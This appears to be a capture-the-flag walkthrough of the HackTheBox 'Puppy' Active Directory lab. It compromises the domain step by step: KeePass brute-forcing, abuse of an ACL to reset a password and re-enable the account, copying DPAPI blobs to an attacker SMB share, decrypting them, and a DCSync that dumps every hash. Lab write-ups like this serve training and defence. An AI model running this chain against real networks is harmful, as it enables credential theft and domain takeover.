![](https://miro.medium.com/v2/resize:fit:789/1*NklLpNcgViz_y-LxEWsC0A.png)

As is common in real life pentests, you will start the Puppy box with credentials for the following account: `levi.james` / `KingofAkron2025!`

nmap result

```
# Nmap 7.95 scan initiated Wed Aug 20 10:52:27 2025 as: /usr/lib/nmap/nmap --privileged -sCV -Pn -vv -T4 -oN nmap.txt 10.10.11.70
Nmap scan report for 10.10.11.70
Host is up, received user-set (0.33s latency).
Scanned at 2025-08-20 10:52:27 IST for 244s
Not shown: 986 filtered tcp ports (no-response)
Bug in iscsi-info: no string output.
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-20 12:22:52Z)
111/tcp  open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
636/tcp  open  tcpwrapped    syn-ack ttl 127
2049/tcp open  nlockmgr      syn-ack ttl 127 1-4 (RPC #100021)
3260/tcp open  iscsi?        syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 6h59m56s
| smb2-time:
|   date: 2025-08-20T12:24:51
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 62785/tcp): CLEAN (Timeout)
|   Check 2 (port 31083/tcp): CLEAN (Timeout)
|   Check 3 (port 26380/udp): CLEAN (Timeout)
|   Check 4 (port 63353/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 20 10:56:31 2025 -- 1 IP address (1 host up) scanned in 244.72 seconds
```

# **RPC**

![](https://miro.medium.com/v2/resize:fit:440/1*3Ajz64tl4HjIz68bL_E-Eg.png)

Get a list of users

```
Administrator
Guest
krbtgt
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

# **SMBMAP**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*Q4GrSSjuo9oRPbnX_IdUDw.png)

You can see that there is a `DEV`directory that is currently inaccessible

# **Bloodhound[#](https://www.hyhforever.top/posts/2025/05/htb-puppy/#bloodhound)**

Add `dc.puppy.htb`to `/etc/hosts`, and then synchronize the time

```
ntpdate puppy.htb
```

![](https://miro.medium.com/v2/1*5cL29rgP81ohkwHMhqdUlg.png)

Collect

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*D4iB6PFTuZ3Ip0C_GhXW4Q.png)

![](https://miro.medium.com/v2/resize:fit:845/1*0SeZM-1gduBJfiB_phM06Q.png)

Check that `james`the user has write permission for `developers`the group, so you can write yourself to that group

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*mgaZFv-v_5Q11P6_nEd-1g.png)

Then you can enter `SMB`the `DEV`directory

# **Keepass Brute**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*VwfdA0Z9ZbnhryMHK59paw.png)

I tried to download `recovery.kdbx`it, `keepass2john`but it showed the wrong version.

```
❯ keepass2john recovery.kdbx
! recovery.kdbx : File version '40000' is currently not supported!
```

https://github.com/r3nt0n/keepass4brute

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*GaPfpRI_h6Zr8t64QzE2SQ.png)

Got the password `liverpool`, here I use `keepassxc`to open the file

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*GqBAynUU9aHyfQThPFhB3w.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*tebGPA9Pom9Klw9-_Fdv_g.png)

You can get some password values

![](https://miro.medium.com/v2/resize:fit:415/1*EHA6btXjagT6RWaa0AovvA.png)

![](https://miro.medium.com/v2/resize:fit:384/1*QtOhqBH36ZM5g3Z60bkWDg.png)

# **Netexec**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1250/1*4Vwayme1VBc0ZIT1VWL5hA.png)

You can see the account that has been successfully verified: `ant.edwards`/`Antman2025!`

# **Bloodhound**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1250/1*ftY_mlqQE-swSVD0YxeBWw.png)

j

![](https://miro.medium.com/v2/resize:fit:844/1*v-GHrlA_7oDBXvQUz0ZgiA.png)

You can see that `edwards`the group you are in has full control `silver`, so you can change the password

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*m3lns-a8prvLmQg_Ugn5aA.png)

Although the changes here are successful, I still cannot log in. I found that the reason is that the account is not enabled.

![](https://miro.medium.com/v2/resize:fit:569/1*V2OH-UJRhNnLw8lrKh4uuQ.png)

`ldapsearch`Check it out with

```
$ ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"                       ⏎

Enter LDAP Password:
# extended LDIF
#
# LDAPv3
# base <DC=puppy,DC=htb> with scope subtree
# filter: (sAMAccountName=ADAM.SILVER)
# requesting: ALL
#

# Adam D. Silver, Users, PUPPY.HTB
dn: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Adam D. Silver
sn: Silver
givenName: Adam
initials: D
distinguishedName: CN=Adam D. Silver,CN=Users,DC=PUPPY,DC=HTB
instanceType: 4
whenCreated: 20250219121623.0Z
whenChanged: 20250528182522.0Z
displayName: Adam D. Silver
uSNCreated: 12814
memberOf: CN=DEVELOPERS,DC=PUPPY,DC=HTB
memberOf: CN=Remote Management Users,CN=Builtin,DC=PUPPY,DC=HTB
uSNChanged: 172152
name: Adam D. Silver
objectGUID:: 6XTdGwRTsk6ta8cxNx8K6w==
userAccountControl: 66050
badPwdCount: 0
codePage: 0
countryCode: 0
homeDirectory: C:\Users\adam.silver
badPasswordTime: 133863842084684611
lastLogoff: 0
lastLogon: 133863842265461471
pwdLastSet: 133929303224406100
primaryGroupID: 513
userParameters:: ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI
 CAgUAQaCAFDdHhDZmdQcmVzZW5045S15pSx5oiw44GiGAgBQ3R4Q2ZnRmxhZ3Mx44Cw44Gm44Cy44
 C5EggBQ3R4U2hhZG9344Cw44Cw44Cw44CwKgIBQ3R4TWluRW5jcnlwdGlvbkxldmVs44Sw
objectSid:: AQUAAAAAAAUVAAAAQ9CwWJ8ZBW3HmPiHUQQAAA==
adminCount: 1
accountExpires: 9223372036854775807
logonCount: 6
sAMAccountName: adam.silver
sAMAccountType: 805306368
userPrincipalName: adam.silver@PUPPY.HTB
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=PUPPY,DC=HTB
dSCorePropagationData: 20250309210803.0Z
dSCorePropagationData: 20250228212238.0Z
dSCorePropagationData: 20250219143627.0Z
dSCorePropagationData: 20250219142657.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133863576267401674

# search reference
ref: ldap://ForestDnsZones.PUPPY.HTB/DC=ForestDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://DomainDnsZones.PUPPY.HTB/DC=DomainDnsZones,DC=PUPPY,DC=HTB

# search reference
ref: ldap://PUPPY.HTB/CN=Configuration,DC=PUPPY,DC=HTB

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

`userAccountControl: 66050`Indicates that the account is disabled.

[Become a member](https://miro.medium.com/v2/da:true/resize:fit:0/60026f4340686a391639ac58864da18070aa773cea45de6e55fa47fd56bfdb74)

Use `ldapmodify`to modify this value

![](https://miro.medium.com/v2/resize:fit:833/1*7C6yL8Jy9-j4aieH5t6l8g.png)

**get user.txt**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*OAI5QIlhdF90zML5WF2esw.png)

after again verify password is working

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*wgY5pMuPfbCYI65R4aKnlQ.png)

# **Privilege Escalation**

`bloodhond`The result is nothing special

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*DN010J7QuOHlOBpyU50FAg.png)

Check that there is a `Backup`directory under the root directory

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*o7EW-x9XO-2ooI9TZ6k_mw.png)

After decompression `bak`, you will see a file with a user credential: `steph.cooper`/ `ChefSteph2025!`which can be used to log in.

![](https://miro.medium.com/v2/resize:fit:843/1*DNdJKa9s8zOsjp-kC-KfTQ.png)

It is similar to `silver`something I found on the desktop before.`DPAPI`

```
*Evil-WinRM* PS C:\Users\adam.silver\desktop> dir -h

    Directory: C:\Users\adam.silver\desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         2/28/2025  12:31 PM            282 desktop.ini
-a-hs-         2/28/2025  12:31 PM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

Try `steph`looking for it here. First, you need to get the credentials saved in Windows Credential Manager . It uses DPAPI encryption (CryptProtectData) and binds the MasterKey of the user or computer .

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h

    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9
```

Downloading directly here seems to give an error, I opened a `smb`service to transfer

```
❯ impacket-smbserver share ./share -smb2support
```

Target drone

```
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.16.75\share\masterkey_blob
*Evil-WinRM* PS C:\> copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" \\10.10.16.75\share\credential_blob
```

Use the user password ( `ChefSteph2025!`) and `SID`decrypt the user's `DPAPI`master key ( `masterkey`) to output the user's master key (decrypted Key)

```
$ impacket-dpapi masterkey -file masterkey_blob -password 'ChefSteph2025!' -sid S-1-5-21-1487982659-1829050783-2281216199-1107
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
Flags       :        0 (0)
Policy      : 4ccf1275 (1288639093)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

Decrypt the stored credentials using the master key obtained in step 1`credential_blob` ( ), outputting the plaintext credentials (username and password)

```
$ impacket-dpapi credential -file credential_blob -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[CREDENTIAL]
LastWritten : 2025-03-08 15:54:29
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=PUPPY.HTB
Description :
Unknown     :
Username    : steph.cooper_adm
Unknown     : FivethChipOnItsWay2025!
```

again`bloodhound`

```
❯ nxc ldap -u 'steph.cooper_adm' -p 'FivethChipOnItsWay2025!'  -d puppy.htb -ns 10.10.11.70 -c All --verbose
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: [Errno Connection error (10.10.11.70:445)] timed out
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
INFO: Done in 01M 20S
INFO: Compressing output into 20250528153956_bloodhound.zip
```

It can be `DCSync`direct

![](https://miro.medium.com/v2/resize:fit:845/1*OwAR52q8uTnPTZGyAJ6BzQ.png)

```
$ impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0xa943f13896e3e21f6c4100c7da9895a6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9c541c389e2904b9b112f599fd6b333d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
PUPPY\DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
PUPPY\DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
PUPPY\DC$:des-cbc-md5:54e9a11619f8b9b5
PUPPY\DC$:plain_password_hex:84880c04e892448b6419dda6b840df09465ffda259692f44c2b3598d8f6b9bc1b0bc37b17528d18a1e10704932997674cbe6b89fd8256d5dfeaa306dc59f15c1834c9ddd333af63b249952730bf256c3afb34a9cc54320960e7b3783746ffa1a1528c77faa352a82c13d7c762c34c6f95b4bbe04f9db6164929f9df32b953f0b419fbec89e2ecb268ddcccb4324a969a1997ae3c375cc865772baa8c249589e1757c7c36a47775d2fc39e566483d0fcd48e29e6a384dc668228186a2196e48c7d1a8dbe6b52fc2e1392eb92d100c46277e1b2f43d5f2b188728a3e6e5f03582a9632da8acfc4d992899f3b64fe120e13
PUPPY\DC$:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0xc21ea457ed3d6fd425344b3a5ca40769f14296a3
dpapi_userkey:0xcb6a80b44ae9bdd7f368fb674498d265d50e29bf
[*] NL$KM
 0000   DD 1B A5 A0 33 E7 A0 56  1C 3F C3 F5 86 31 BA 09   ....3..V.?...1..
 0010   1A C4 D4 6A 3C 2A FA 15  26 06 3B 93 E0 66 0F 7A   ...j<*..&.;..f.z
 0020   02 9A C7 2E 52 79 C1 57  D9 0C D3 F6 17 79 EF 3F   ....Ry.W.....y.?
 0030   75 88 A3 99 C7 E0 2B 27  56 95 5C 6B 85 81 D0 ED   u.....+'V.\k....
NL$KM:dd1ba5a033e7a0561c3fc3f58631ba091ac4d46a3c2afa1526063b93e0660f7a029ac72e5279c157d90cd3f61779ef3f7588a399c7e02b2756955c6b8581d0ed
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<HIDDEN>:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a4f2989236a639ef3f766e5fe1aad94a:::
PUPPY.HTB\levi.james:1103:aad3b435b51404eeaad3b435b51404ee:ff4269fdf7e4a3093995466570f435b8:::
PUPPY.HTB\ant.edwards:1104:aad3b435b51404eeaad3b435b51404ee:afac881b79a524c8e99d2b34f438058b:::
PUPPY.HTB\adam.silver:1105:aad3b435b51404eeaad3b435b51404ee:a7d7c07487ba2a4b32fb1d0953812d66:::
PUPPY.HTB\jamie.williams:1106:aad3b435b51404eeaad3b435b51404ee:bd0b8a08abd5a98a213fc8e3c7fca780:::
PUPPY.HTB\steph.cooper:1107:aad3b435b51404eeaad3b435b51404ee:b261b5f931285ce8ea01a8613f09200b:::
PUPPY.HTB\steph.cooper_adm:1111:aad3b435b51404eeaad3b435b51404ee:ccb206409049bc53502039b80f3f1173:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5047916131e6ba897f975fc5f19c8df:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:c0b23d37b5ad3de31aed317bf6c6fd1f338d9479def408543b85bac046c596c0
Administrator:aes128-cts-hmac-sha1-96:2c74b6df3ba6e461c9d24b5f41f56daf
Administrator:des-cbc-md5:20b9e03d6720150d
krbtgt:aes256-cts-hmac-sha1-96:f2443b54aed754917fd1ec5717483d3423849b252599e59b95dfdcc92c40fa45
krbtgt:aes128-cts-hmac-sha1-96:60aab26300cc6610a05389181e034851
krbtgt:des-cbc-md5:5876d051f78faeba
PUPPY.HTB\levi.james:aes256-cts-hmac-sha1-96:2aad43325912bdca0c831d3878f399959f7101bcbc411ce204c37d585a6417ec
PUPPY.HTB\levi.james:aes128-cts-hmac-sha1-96:661e02379737be19b5dfbe50d91c4d2f
PUPPY.HTB\levi.james:des-cbc-md5:efa8c2feb5cb6da8
PUPPY.HTB\ant.edwards:aes256-cts-hmac-sha1-96:107f81d00866d69d0ce9fd16925616f6e5389984190191e9cac127e19f9b70fc
PUPPY.HTB\ant.edwards:aes128-cts-hmac-sha1-96:a13be6182dc211e18e4c3d658a872182
PUPPY.HTB\ant.edwards:des-cbc-md5:835826ef57bafbc8
PUPPY.HTB\adam.silver:aes256-cts-hmac-sha1-96:670a9fa0ec042b57b354f0898b3c48a7c79a46cde51c1b3bce9afab118e569e6
PUPPY.HTB\adam.silver:aes128-cts-hmac-sha1-96:5d2351baba71061f5a43951462ffe726
PUPPY.HTB\adam.silver:des-cbc-md5:643d0ba43d54025e
PUPPY.HTB\jamie.williams:aes256-cts-hmac-sha1-96:aeddbae75942e03ac9bfe92a05350718b251924e33c3f59fdc183e5a175f5fb2
PUPPY.HTB\jamie.williams:aes128-cts-hmac-sha1-96:d9ac02e25df9500db67a629c3e5070a4
PUPPY.HTB\jamie.williams:des-cbc-md5:cb5840dc1667b615
PUPPY.HTB\steph.cooper:aes256-cts-hmac-sha1-96:799a0ea110f0ecda2569f6237cabd54e06a748c493568f4940f4c1790a11a6aa
PUPPY.HTB\steph.cooper:aes128-cts-hmac-sha1-96:cdd9ceb5fcd1696ba523306f41a7b93e
PUPPY.HTB\steph.cooper:des-cbc-md5:d35dfda40d38529b
PUPPY.HTB\steph.cooper_adm:aes256-cts-hmac-sha1-96:a3b657486c089233675e53e7e498c213dc5872d79468fff14f9481eccfc05ad9
PUPPY.HTB\steph.cooper_adm:aes128-cts-hmac-sha1-96:c23de8b49b6de2fc5496361e4048cf62
PUPPY.HTB\steph.cooper_adm:des-cbc-md5:6231015d381ab691
DC$:aes256-cts-hmac-sha1-96:f4f395e28f0933cac28e02947bc68ee11b744ee32b6452dbf795d9ec85ebda45
DC$:aes128-cts-hmac-sha1-96:4d596c7c83be8cd71563307e496d8c30
DC$:des-cbc-md5:7f044607a8dc9710
[*] Cleaning up...
```

Once you get it `hash`, you can log in.

💥 BOOM! 💣🔥

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:875/1*QNOLFhzLD6FAgpdumQ6e9g.png)
